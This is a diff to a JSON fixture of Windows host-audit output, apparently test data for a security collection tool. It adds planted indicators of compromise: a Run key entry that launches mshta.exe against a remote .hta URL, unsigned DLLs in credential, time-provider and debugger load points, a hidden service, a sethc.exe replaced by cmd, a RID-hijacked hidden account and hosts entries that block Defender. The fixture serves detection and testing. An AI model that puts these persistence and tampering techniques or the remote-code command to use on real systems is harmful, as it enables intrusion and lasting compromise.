@@ -13,7 +13,8 @@
     "psVersion": "5.1.20348.2849",
     "options": {
       "skipAcl": false,
-      "checkUpdates": true
+      "checkUpdates": true,
+      "namedPipes": true
     },
     "sectionsCollected": [
       "host",
@@ -44,6 +45,12 @@
       "certificates",
       "wifi",
       "browserExtensions",
+      "loadPoints",
+      "tamper",
+      "localGroups",
+      "shares",
+      "dns",
+      "surface",
       "updatesPending"
     ],
     "collectionErrors": []
@@ -105,6 +112,17 @@
     ],
     "exclusionProcesses": [
       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    ],
+    "asrExclusions": [
+      "C:\\Users\\jsmith\\AppData\\Local\\Temp"
+    ],
+    "asrRuleExclusions": [
+      {
+        "rule": "d4f940ab-401b-4efc-aadc-ad5f3c50688a",
+        "paths": [
+          "C:\\Program Files\\Contoso ERP\\erp.exe"
+        ]
+      }
     ],
     "asrRules": [
       {
@@ -271,6 +289,15 @@
         "passwordExpires": false,
         "lastLogonUtc": "2026-09-01T09:00:00Z",
         "passwordLastSetUtc": "2021-06-01T09:00:00Z"
+      },
+      {
+        "name": "helper$",
+        "sid": "S-1-5-21-4000000001-4000000002-4000000003-1003",
+        "enabled": true,
+        "passwordRequired": true,
+        "passwordExpires": true,
+        "lastLogonUtc": null,
+        "passwordLastSetUtc": "2026-09-01T00:00:00Z"
       }
     ],
     "administrators": [
@@ -989,6 +1016,64 @@
       "smartNameResolutionOff": null,
       "lockedUserInfo": 1,
       "kerberosArmor": null
+    },
+    "credsspDelegation": {
+      "encryptionOracle": 2,
+      "AllowDefaultCredentials": {
+        "on": 1,
+        "servers": [
+          "*"
+        ]
+      },
+      "AllowDefCredentialsWhenNTLMOnly": {
+        "on": null,
+        "servers": []
+      },
+      "AllowSavedCredentials": {
+        "on": null,
+        "servers": []
+      },
+      "AllowSavedCredentialsWhenNTLMOnly": {
+        "on": null,
+        "servers": []
+      },
+      "AllowFreshCredentials": {
+        "on": 1,
+        "servers": [
+          "TERMSRV/rds01.corp.example"
+        ]
+      },
+      "AllowFreshCredentialsWhenNTLMOnly": {
+        "on": null,
+        "servers": []
+      }
+    },
+    "winrmClient": {
+      "trustedHosts": "*",
+      "policyTrustedHosts": null,
+      "policyTrustedHostsList": ""
+    },
+    "remoteSessionControl": {
+      "shadowPolicy": 2,
+      "shadowLocal": 1,
+      "offerPolicy": 1,
+      "offerFullControl": 1,
+      "solicitedPolicy": null,
+      "solicitedLocal": 1
+    },
+    "dsrmAdminLogonBehavior": null,
+    "sudo": {
+      "enabled": 3,
+      "policy": null
+    },
+    "developerMode": {
+      "allowDevelopment": 1,
+      "policyAllowDevelopment": null
+    },
+    "recall": {
+      "feature": 1,
+      "disableAiDataAnalysis": null,
+      "allowRecallEnablement": null
     }
   },
   "stig": {
@@ -4017,6 +4102,20 @@
       "startableBy": [],
       "permissionsRead": true,
       "permissions": []
+    },
+    {
+      "name": "VSS",
+      "displayName": "VSS",
+      "startMode": "Disabled",
+      "state": "Stopped",
+      "account": "LocalSystem",
+      "pathName": "C:\\Windows\\system32\\vssvc.exe",
+      "executable": "C:\\Windows\\system32\\vssvc.exe",
+      "writableBy": [],
+      "ancestorControl": [],
+      "startableBy": [],
+      "permissionsRead": true,
+      "permissions": []
     }
   ],
   "drivers": {
@@ -4155,6 +4254,13 @@
           "rights": "Modify, Synchronize"
         }
       ]
+    },
+    {
+      "location": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "MediaSync",
+      "command": "C:\\Windows\\System32\\mshta.exe https://cdn.example.net/sync.hta",
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "writableBy": []
     }
   ],
   "writablePaths": {
@@ -4544,5 +4650,587 @@
         ]
       }
     ]
+  },
+  "loadPoints": {
+    "networkProviders": [
+      {
+        "name": "RDPNP",
+        "dll": "C:\\Windows\\System32\\drprov.dll",
+        "exists": true,
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "LanmanWorkstation",
+        "dll": "C:\\Windows\\System32\\ntlanman.dll",
+        "exists": true,
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "LogonNotify",
+        "dll": "C:\\Windows\\System32\\lognp.dll",
+        "exists": true,
+        "signer": null,
+        "status": "NotSigned"
+      }
+    ],
+    "credentialProviders": [
+      {
+        "kind": "provider",
+        "clsid": "{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}",
+        "name": "PasswordProvider",
+        "dll": "C:\\Windows\\system32\\credprovs.dll",
+        "exists": true,
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "kind": "filter",
+        "clsid": "{0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0}",
+        "name": "Contoso SSO Filter",
+        "dll": "C:\\Program Files\\Contoso SSO\\cpfilter.dll",
+        "exists": true,
+        "signer": "Contoso Ltd.",
+        "status": "Valid"
+      }
+    ],
+    "appCertDlls": [
+      {
+        "name": "certhelp",
+        "dll": "C:\\ProgramData\\certhelp.dll",
+        "exists": true,
+        "signer": null,
+        "status": "NotSigned"
+      }
+    ],
+    "sessionManagerExecute": [
+      {
+        "value": "BootExecute",
+        "command": "autocheck autochk *"
+      },
+      {
+        "value": "BootExecute",
+        "command": "bootsvc.exe /q"
+      }
+    ],
+    "timeProviders": [
+      {
+        "name": "NtpClient",
+        "dll": "C:\\Windows\\system32\\w32time.dll",
+        "enabled": 1,
+        "exists": true,
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "NtpExtra",
+        "dll": "C:\\Windows\\Temp\\ntpx.dll",
+        "enabled": 1,
+        "exists": true,
+        "signer": null,
+        "status": "NotSigned"
+      }
+    ],
+    "printProcessors": [
+      {
+        "environment": "Windows x64",
+        "name": "winprint",
+        "driver": "winprint.dll",
+        "exists": true,
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "environment": "Windows x64",
+        "name": "ContosoPrint",
+        "driver": "ctxprint.dll",
+        "exists": true,
+        "signer": "Contoso Ltd.",
+        "status": "Valid"
+      }
+    ],
+    "dotnetProfiler": {
+      "values": {
+        "COR_ENABLE_PROFILING": "1",
+        "COR_PROFILER": "{11111111-2222-3333-4444-555555555555}",
+        "COR_PROFILER_PATH_64": "C:\\Users\\Public\\prof64.dll"
+      },
+      "dll": "C:\\Users\\Public\\prof64.dll",
+      "exists": true,
+      "signer": null,
+      "status": "NotSigned"
+    },
+    "aeDebug": [
+      {
+        "wow64": false,
+        "debugger": "\"C:\\ProgramData\\dbg\\crashmon.exe\" -p %ld -e %ld",
+        "auto": 1,
+        "exists": true,
+        "signer": null,
+        "status": "NotSigned"
+      }
+    ],
+    "serviceHooks": [
+      {
+        "name": "WinHelperSvc",
+        "start": 2,
+        "serviceDll": "C:\\ProgramData\\WinHelper\\helper.dll",
+        "exists": true,
+        "signer": null,
+        "status": "NotSigned",
+        "failureCommand": "C:\\ProgramData\\WinHelper\\restart.cmd"
+      }
+    ],
+    "hiddenServices": [
+      {
+        "name": "SysCacheSvc",
+        "imagePath": "C:\\Windows\\Temp\\syscache.exe",
+        "deniedTo": [
+          "S-1-5-4",
+          "S-1-5-32-545",
+          "S-1-5-32-544"
+        ],
+        "notListed": true
+      }
+    ],
+    "hiddenTasks": [
+      {
+        "path": "\\Microsoft\\Windows\\UpdateOrchestrator\\CacheRefresh",
+        "noSecurityDescriptor": true,
+        "indexZero": false,
+        "xmlExists": true
+      }
+    ],
+    "logonScripts": [
+      {
+        "scope": "Machine",
+        "event": "Startup",
+        "powershell": true,
+        "command": "C:\\Windows\\Temp\\init.ps1",
+        "parameters": "",
+        "user": ""
+      },
+      {
+        "scope": "User",
+        "event": "UserInitMprLogonScript",
+        "powershell": false,
+        "command": "C:\\Users\\jsmith\\AppData\\Roaming\\logon.bat",
+        "parameters": "",
+        "user": "jsmith"
+      }
+    ],
+    "psProfiles": [
+      {
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1",
+        "length": 412,
+        "writableBy": [
+          {
+            "scope": "file",
+            "sid": "S-1-5-32-545",
+            "rights": "Modify, Synchronize"
+          }
+        ]
+      }
+    ],
+    "officeTestMachine": [
+      {
+        "wow64": false,
+        "dll": "C:\\Users\\Public\\offtest.dll"
+      }
+    ],
+    "officeProfiles": [
+      {
+        "user": "jsmith",
+        "officeTest": "",
+        "homePages": [
+          {
+            "folder": "Inbox",
+            "url": "http://203.0.113.10/inbox.html"
+          }
+        ],
+        "xll": [
+          "C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\AddIns\\pricing.xll"
+        ],
+        "accessVbom": [
+          "Word 16.0",
+          "Excel 16.0"
+        ]
+      }
+    ],
+    "userHivesRead": 1,
+    "ssh": {
+      "installed": true,
+      "adminKeys": {
+        "path": "C:\\ProgramData\\ssh\\administrators_authorized_keys",
+        "keys": 2,
+        "writableBy": [
+          {
+            "scope": "file",
+            "sid": "S-1-5-11",
+            "rights": "Modify, Synchronize"
+          }
+        ]
+      },
+      "userKeys": [
+        {
+          "user": "jsmith",
+          "keys": 1
+        }
+      ]
+    },
+    "bitsJobs": [
+      {
+        "name": "Font cache refresh",
+        "owner": "CORP\\jsmith",
+        "state": "Transferred",
+        "notifyCmdLine": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\fc.exe /run",
+        "createdUtc": "2026-09-20T08:00:00Z"
+      }
+    ],
+    "bitsJobCount": 2,
+    "accessibility": [
+      {
+        "name": "sethc.exe",
+        "originalName": "Cmd.Exe.MUI",
+        "internalName": "cmd",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "utilman.exe",
+        "originalName": "utilman2.exe.mui",
+        "internalName": "utilman2.exe",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "osk.exe",
+        "originalName": "osk.exe.mui",
+        "internalName": "osk.exe",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "narrator.exe",
+        "originalName": "SR.exe.mui",
+        "internalName": "SR.exe",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "magnify.exe",
+        "originalName": "ScreenMagnifier.exe.mui",
+        "internalName": "ScreenMagnifier.exe",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "displayswitch.exe",
+        "originalName": "DisplaySwitch.mui",
+        "internalName": "DisplaySwitch",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      },
+      {
+        "name": "atbroker.exe",
+        "originalName": "ATBroker.exe.mui",
+        "internalName": "ATBroker.exe",
+        "signer": "Microsoft Windows",
+        "status": "Valid"
+      }
+    ],
+    "missingTargets": [
+      {
+        "source": "service",
+        "name": "OldAgentSvc",
+        "executable": "C:\\OldAgent\\bin\\agent.exe",
+        "existingFolder": "C:\\",
+        "missingLevels": 2,
+        "creators": [
+          {
+            "sid": "S-1-5-11",
+            "rights": "AppendData"
+          }
+        ]
+      }
+    ]
+  },
+  "tamper": {
+    "miniNt": false,
+    "eventLogStart": 2,
+    "autologgers": [
+      {
+        "name": "EventLog-Security",
+        "start": 1
+      },
+      {
+        "name": "EventLog-System",
+        "start": 0
+      },
+      {
+        "name": "DefenderApiLogger",
+        "start": 0
+      }
+    ],
+    "securityAuditingProvider": 1,
+    "systemStartOptions": "NOEXECUTE=OPTIN TESTSIGNING",
+    "hosts": {
+      "read": true,
+      "total": 3,
+      "entries": [
+        {
+          "address": "0.0.0.0",
+          "name": "fe2.update.microsoft.com"
+        },
+        {
+          "address": "0.0.0.0",
+          "name": "sls.update.microsoft.com"
+        },
+        {
+          "address": "127.0.0.1",
+          "name": "wdcp.microsoft.com"
+        }
+      ]
+    },
+    "winHttpProxy": {
+      "flags": 3,
+      "proxy": "127.0.0.1:8888",
+      "bypass": "<local>"
+    },
+    "trustedPublishers": [
+      {
+        "thumbprint": "1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D",
+        "store": "gpo",
+        "subject": "CN=Corp Code Signing, O=Corp",
+        "notAfterUtc": "2028-01-01T00:00:00Z"
+      },
+      {
+        "thumbprint": "9F8E7D6C5B4A39281706F5E4D3C2B1A09F8E7D6C",
+        "store": "machine",
+        "subject": "CN=Fabrikam Tools, O=Fabrikam",
+        "notAfterUtc": "2029-05-01T00:00:00Z"
+      }
+    ]
+  },
+  "localGroups": {
+    "groups": [
+      {
+        "sid": "S-1-5-32-551",
+        "name": "Backup Operators",
+        "members": [
+          {
+            "path": "CORP/jsmith",
+            "sid": "S-1-5-21-1111111111-2222222222-3333333333-1201",
+            "class": "User"
+          }
+        ]
+      },
+      {
+        "sid": "S-1-5-32-580",
+        "name": "Remote Management Users",
+        "members": [
+          {
+            "path": "NT AUTHORITY/Authenticated Users",
+            "sid": "S-1-5-11",
+            "class": "Group"
+          }
+        ]
+      }
+    ],
+    "samRead": true,
+    "rids": [
+      {
+        "keyRid": 500,
+        "fRid": 500
+      },
+      {
+        "keyRid": 501,
+        "fRid": 501
+      },
+      {
+        "keyRid": 1003,
+        "fRid": 500
+      }
+    ]
+  },
+  "dns": {
+    "dohPolicy": null,
+    "autoDoh": null,
+    "wellKnown": [
+      "1.1.1.1",
+      "8.8.8.8"
+    ],
+    "adapters": [
+      {
+        "name": "Intel(R) Ethernet Connection I219-LM",
+        "dhcp": true,
+        "servers": [
+          "10.0.0.10",
+          "10.0.0.11",
+          "fec0:0:0:ffff::1"
+        ],
+        "doh": []
+      },
+      {
+        "name": "Corp VPN Adapter",
+        "dhcp": false,
+        "servers": [
+          "9.9.9.9"
+        ],
+        "doh": [
+          {
+            "server": "9.9.9.9",
+            "flags": 2,
+            "template": true
+          }
+        ]
+      },
+      {
+        "name": "Realtek Wi-Fi 6 Adapter",
+        "dhcp": true,
+        "servers": [
+          "8.8.8.8",
+          "192.168.1.1"
+        ],
+        "doh": []
+      }
+    ]
+  },
+  "shares": [
+    {
+      "name": "Docs",
+      "path": "D:\\Docs",
+      "defaultPermissions": false,
+      "access": [
+        {
+          "sid": "S-1-1-0",
+          "mask": 1179817
+        }
+      ],
+      "ntfsWriters": []
+    },
+    {
+      "name": "ScanDrop",
+      "path": "C:\\ScanDrop",
+      "defaultPermissions": false,
+      "access": [
+        {
+          "sid": "S-1-1-0",
+          "mask": 2032127
+        }
+      ],
+      "ntfsWriters": [
+        {
+          "sid": "S-1-1-0",
+          "rights": "Modify, Synchronize"
+        }
+      ]
+    }
+  ],
+  "surface": {
+    "printers": {
+      "local": 1,
+      "shared": 0
+    },
+    "features": {
+      "Microsoft-Windows-Subsystem-Linux": 1,
+      "VirtualMachinePlatform": 1,
+      "Microsoft-Hyper-V-All": 1
+    },
+    "wslDistributions": [
+      {
+        "user": "jsmith",
+        "name": "Ubuntu-24.04",
+        "version": 2
+      }
+    ],
+    "userHivesRead": 1,
+    "officeAddins": [
+      {
+        "app": "Outlook",
+        "progId": "UCAddin.LyncAddin.1",
+        "scope": "machine",
+        "loadBehavior": 3,
+        "kind": "com",
+        "manifest": "",
+        "dll": {
+          "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\UCADDIN.DLL",
+          "exists": true,
+          "signer": "Microsoft Corporation",
+          "status": "Valid"
+        }
+      },
+      {
+        "app": "Excel",
+        "progId": "PriceSync.Connect",
+        "scope": "jsmith",
+        "loadBehavior": 3,
+        "kind": "com",
+        "manifest": "",
+        "dll": {
+          "path": "C:\\Users\\jsmith\\AppData\\Roaming\\PriceSync\\pricesync64.dll",
+          "exists": true,
+          "signer": null,
+          "status": "NotSigned"
+        }
+      }
+    ],
+    "credentialFiles": [
+      {
+        "user": "jsmith",
+        "count": 14
+      }
+    ],
+    "systemRestore": {
+      "disableSR": 1,
+      "disableConfig": null
+    },
+    "tpm": {
+      "present": false,
+      "enabled": false,
+      "activated": false
+    },
+    "helloPinUsers": 1,
+    "helloForBusiness": null,
+    "firewallUserApps": [
+      {
+        "program": "C:\\Users\\jsmith\\Downloads\\AnyDesk.exe",
+        "store": "local",
+        "profiles": [
+          "Public"
+        ],
+        "anyRemote": true,
+        "protocol": 6
+      },
+      {
+        "program": "C:\\Users\\jsmith\\Downloads\\AnyDesk.exe",
+        "store": "local",
+        "profiles": [
+          "Public"
+        ],
+        "anyRemote": true,
+        "protocol": 17
+      }
+    ],
+    "namedPipes": {
+      "total": 180,
+      "read": 41,
+      "writable": [
+        {
+          "name": "lsass",
+          "sids": [
+            "S-1-1-0"
+          ]
+        },
+        {
+          "name": "FabrikamUpdaterPipe",
+          "sids": [
+            "S-1-1-0",
+            "S-1-5-11"
+          ]
+        }
+      ]
+    }
   }
 }
